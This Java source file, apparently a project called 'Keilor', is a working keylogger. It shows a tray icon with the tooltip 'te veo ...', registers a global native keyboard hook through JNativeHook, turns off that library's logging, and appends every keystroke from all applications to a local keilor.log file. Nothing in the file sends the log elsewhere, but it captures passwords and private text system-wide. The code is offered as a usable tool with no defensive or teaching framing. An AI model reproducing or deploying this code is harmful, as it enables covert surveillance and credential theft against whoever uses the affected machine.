package org.quasi.keilor;  

import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.net.URL;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.logging.*;
import javax.swing.*;

import org.jnativehook.*;
import org.jnativehook.keyboard.*;


public class TrayIconKeilor {
	
    public static void main(String[] args) {
        /* Use an appropriate Look and Feel */
        try {
            UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
            //UIManager.setLookAndFeel("javax.swing.plaf.metal.MetalLookAndFeel");
            UIManager.put("swing.boldMetal", Boolean.FALSE);
        } catch (UnsupportedLookAndFeelException ex) {
            ex.printStackTrace();
        } catch (IllegalAccessException ex) {
            ex.printStackTrace();
        } catch (InstantiationException ex) {
            ex.printStackTrace();
        } catch (ClassNotFoundException ex) {
            ex.printStackTrace();
        }
        //Schedule a job for the event-dispatching thread: adding TrayIcon.
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                createAndShowGUI();
            }
        });
    }
    
    private static void createAndShowGUI() {
        if (!SystemTray.isSupported()) {
            System.out.println("SystemTray is not supported");
            return;
        }
        //Initialize
        final PopupMenu popup= new PopupMenu();
        final TrayIcon trayIcon= new TrayIcon(createImage("/img/keilor.gif", "tray icon"));
        final SystemTray tray= SystemTray.getSystemTray();
        //Create a popup menu components
        MenuItem flushItem = new MenuItem("Flush");
        MenuItem exitItem = new MenuItem("Exit");
        popup.add(flushItem);
        popup.addSeparator();
        popup.add(exitItem);
        //TrayIcon properties
        trayIcon.setPopupMenu(popup);
        trayIcon.setToolTip("te veo ...");
        //startup
        try {
            tray.add(trayIcon);
            TrayIconKeilor.KeilorListener.enable(null);
        } catch (AWTException e) {
            System.out.println("TrayIcon could not be added.");
            return;
        }
        //def. flush option
        flushItem.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
            	TrayIconKeilor.KeilorListener.flush();
            }
        });      
        //def. exit option
        exitItem.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
            	TrayIconKeilor.KeilorListener.disable();
                tray.remove(trayIcon);
                System.exit(0);
            }
        });
    }
    
    private static Image createImage(String path, String description) {
        URL imageURL= TrayIconKeilor.class.getResource(path);
        if (imageURL==null) {
            System.err.println("Resource not found: " + path);
            return null;
        } else {
            return (new ImageIcon(imageURL, description)).getImage();
        }
    }
    
    
    static class KeilorListener implements NativeKeyListener {
    	private static DateTimeFormatter formatter= DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    	private static String currPath= Paths.get(".").toAbsolutePath().normalize().toString()+"/keilor.log";
    	private static PrintWriter out= null;
    	
        public static void enable(String[] args) {
    		Logger logger= Logger.getLogger(GlobalScreen.class.getPackage().getName());
        	logger.setLevel(Level.OFF); 
        	logger.setUseParentHandlers(false);
        	try {  		
        	    out= new PrintWriter( new BufferedWriter( new FileWriter(currPath, true) ) ); 
        	    out.println("\n["+LocalDateTime.now().format(formatter)+"]  ==========================>");  
        	    out.flush();
        	}catch (IOException e1) {  
                System.err.println("There was a problem opening the Log file: "+ e1.getMessage());
                System.exit(1);
        	}
            try {
                GlobalScreen.registerNativeHook();
                GlobalScreen.addNativeKeyListener(new KeilorListener());
            }catch (NativeHookException ex) {
                System.err.println("There was a problem registering the native hook: "+ex.getMessage());
                System.exit(1);
            }
        }
        
        public static void disable() {
        	try {
				GlobalScreen.unregisterNativeHook();
			} catch (NativeHookException e1) {
				e1.printStackTrace();
			}
        	if(out!=null) {
        		out.flush();
        		out.close();
        	}
        }
        
        public static void flush() {
        	if(out!=null) {
        		out.flush();
        	}
        }
        
        public void nativeKeyPressed(NativeKeyEvent e) {
        	if(e.isActionKey()) {
        		out.print("["+NativeKeyEvent.getKeyText(e.getKeyCode())+"]");
        	}else {
        		out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));	
        	}
        }
        
        public void nativeKeyReleased(NativeKeyEvent e) {}
        public void nativeKeyTyped(NativeKeyEvent e) {}
    }    
    
}
